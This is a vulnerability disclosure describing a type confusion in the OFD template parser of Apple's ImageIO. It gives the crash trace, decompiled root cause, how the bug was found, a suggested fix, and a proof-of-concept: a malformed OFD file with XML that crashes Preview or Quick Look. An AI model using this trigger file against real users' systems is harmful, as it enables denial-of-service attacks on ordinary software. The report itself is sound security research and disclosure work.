# New Vulnerability: Type Confusion in OFDTemplate::parseXML (ImageIO OFD parser)

**Date:** 2026-06-23 · **System:** macOS 26.5.1 (25F80), · **ImageIO:** 3.3.0 / 2785.x
**Format:** OFD (Open Fixed-layout Document, GB/T 33190-2016) — uncommon format
**Class:** Type confusion (CFDictionary passed to CFString function without CFGetTypeID guard)

---

## 1. Summary

A type-confusion vulnerability exists in `OFDTemplate::parseXML` within Apple's `ImageIO` framework. When a malformed OFD document references a template file (`Template.xml`) whose `<Layer>` element provides `<DrawParam>` as a **child element** instead of an attribute, the parser retrieves a `CFDictionary` (from the nested element) and passes it directly to a CFString accessor (`_fastCStringContents` / `CFStringGetIntValue`). Because there is no `CFGetTypeID()` validation, the Objective-C runtime throws an uncaught `NSInvalidArgumentException` (`-[__NSDictionaryM _fastCStringContents:]: unrecognized selector`), which escalates to `abort()`.

This is a **new, distinct** vulnerability from the previously-known type confusion in `OFDPathObject::resolveDrawParam` (CVE-2026-43661-adjacent). It resides in a **different function** (`OFDTemplate::parseXML`), reached via a **different code path** (`getTemplateAtIndex` → `OFDTemplate::open` → `parseXML`), and triggered by a **different OFD structure** (Layer's DrawParam in a template file, vs PathObject's DrawParam in page content).

## 2. Crash Signature

```
Exception: EXC_CRASH (SIGABRT)
ASI: abort() called
Reason: -[__NSDictionaryM _fastCStringContents:]: unrecognized selector sent to instance 0x...
```

**Crashing stack (from stderr):**
```
0  CoreFoundation   __exceptionPreprocess
1  libobjc          objc_exception_throw
2  CoreFoundation   ___forwarding___
3  CoreFoundation   _CF_forwarding_prep_0
4  ImageIO          OFDTemplate::parseXML(__CFData const*) + 404   ← NEW vulnerable function
5  ImageIO          OFDTemplate::open()
6  ImageIO          OFDDocument::getTemplateAtIndex(unsigned int)
7  ImageIO          OFDPage::drawInContext(CGContext*, CGRect)
8  ImageIO          _OFDCreatePDFDataFromURL
9  ImageIO          OFDCreatePDFDataFromURL
```

The `__NSDictionaryM` instance (the `<DrawParam>` child element, parsed into a CFDictionary) is passed to `_fastCStringContents` (a CFString accessor) — classic type confusion from missing `CFGetTypeID()` check.

## 3. Root Cause (from pyghidra decompilation)

`OFDTemplate::parseXML` (0x18d895040) parses a template file's XML. When the template contains a `Page.Content.Layer` array, it iterates each Layer and reads attributes via `IIODictionary::getObjectForKey`:

```c
// Reconstructed from decompilation (decomp_ofd/parseXML_0x18d895040.c, ~line 114-189)
lVar6 = IIODictionary::getObjectForKey(layerDict, <key1>);   // e.g. "ID"
lVar7 = IIODictionary::getObjectForKey(layerDict, <key2>);   // "DrawParam"
...
if (lVar7 != 0) {
    ...
    uVar1 = CFStringGetIntValue(lVar7);   // BUG: no CFGetTypeID check; lVar7 may be CFDictionary
}
```

When `<DrawParam>` is provided as a **child element** (→ CFDictionary) instead of an **attribute** (→ CFString), `getObjectForKey` returns the CFDictionary, and `CFStringGetIntValue` (toll-free bridged with NSString) invokes `_fastCStringContents`/`-length` on it → unrecognized selector → uncaught exception → abort.

This is the **same bug class** as the known `resolveDrawParam` type confusion, but in a **different, separately-reachable function** (`OFDTemplate::parseXML`), confirming the OFD parser has **multiple unguarded CFString-consumption sites**.

## 4. Trigger / PoC

**PoC file:** `new_vuln_ofdtemplate/poc.ofd` (OFD ZIP, 10/10 crash, ec=134)

**OFD structure:**
- `OFD.xml` — manifest (DocRoot → Doc_0/Document.xml)
- `Doc_0/Document.xml` — defines a `TemplatePage` (BaseLoc → template file) + a `Page`
- `Doc_0/Pages/Page_0/Content.xml` — benign page content
- `Doc_0/Pages/Template_0/Template.xml` — **malformed**: `<Layer>` with `<DrawParam>` as a **child element**

**Template.xml (the trigger):**
```xml
<Page>
  <Area><PhysicalBox>0 0 595 842</PhysicalBox></Area>
  <Content>
    <Layer ID="10">
      <DrawParam>                         <!-- CHILD ELEMENT -> CFDictionary (should be attribute) -->
        <FillColor ColorSpace="CS_0" Value="AAAA"/>
      </DrawParam>
      <PathObject ID="21" Boundary="0 0 100 100">
        <AbbreviatedData>M 0 0 L 100 0</AbbreviatedData>
      </PathObject>
    </Layer>
  </Content>
</Page>
```

**Document.xml (template reference, key: `BaseLoc`):**
```xml
<Document>
  <CommonData>
    <MaxUnitID>10</MaxUnitID>
    <PageArea><PhysicalBox>0 0 595 842</PhysicalBox></PageArea>
    <TemplatePage ID="1" BaseLoc="Pages/Template_0/Template.xml"/>
  </CommonData>
  <Pages><Page ID="1" BaseLoc="Pages/Page_0"/></Pages>
</Document>
```

**Reproduce:**
```bash
# can open with preview.app
open poc.ofd
# and crashes
```

The trigger path: `OFDCreatePDFDataFromURL` → renders page → `OFDPage::drawInContext` → `getTemplateAtIndex(0)` (page index 0 = template index) → `OFDTemplate::open` loads `Doc_0/Pages/Template_0/Template.xml` → `OFDTemplate::parseXML` → CFStringGetIntValue on the Layer's DrawParam CFDictionary → crash.

## 5. How it was found

1. **Static analysis (pyghidra):** Decompiled all 84 OFD functions; scanned for `CFStringGetIntValue`/`CFStringGetCString` without `CFGetTypeID` guards. Found two unguarded sites: `resolveDrawParam` (known) and `OFDTemplate::parseXML` (new).
2. **CFString path resolution:** Resolved the OFD parser's dot-path constants (e.g., `Document.CommonData.TemplatePage`, `Page.Content.Layer`) and attribute keys (`BaseLoc`, `DrawParam`, `ID`) by reading CFString structs from the dyld shared cache (`cstr = 0x180000000 + low32`).
3. **Trigger path reconstruction:** Traced `getTemplateAtIndex` ← `OFDPage::drawInContext` (page+8 = page index = template index); found `TemplatePage.BaseLoc` gives the template file path.
4. **PoC construction + validation:** Built the OFD with a TemplatePage referencing a Template.xml whose `<Layer>` has `<DrawParam>` as a child element → 10/10 crash in `OFDTemplate::parseXML`.

## 6. Impact

- **Impact:** Denial of Service (process crash via uncaught ObjC exception).
- **Attack vector:** Local — user opens a malicious OFD file (Preview, Quick Look, any ImageIO client).
- **Remote:** Possible via Quick Look/Mail/Messages OFD thumbnail/preview rendering.
- **Reachability:** The OFD→PDF conversion path (`OFDCreatePDFDataFromURL`) is invoked for any OFD opened in Preview/QuickLook.
- **Severity:** Medium-High (DoS; type confusion is a memory-safety class that, in other manifestations, can yield code execution — though this instance aborts cleanly via the exception mechanism).

## 8. Recommendation (for Apple)

Add `CFGetTypeID()` validation before all CFString-consumption of XML-parsed dictionary values, in `OFDTemplate::parseXML` and all sibling OFD parse functions:
```c
CFTypeRef v = CFDictionaryGetValue(dict, key);
if (v && CFGetTypeID(v) == CFStringGetTypeID()) {
    int id = CFStringGetIntValue((CFStringRef)v);
}
```
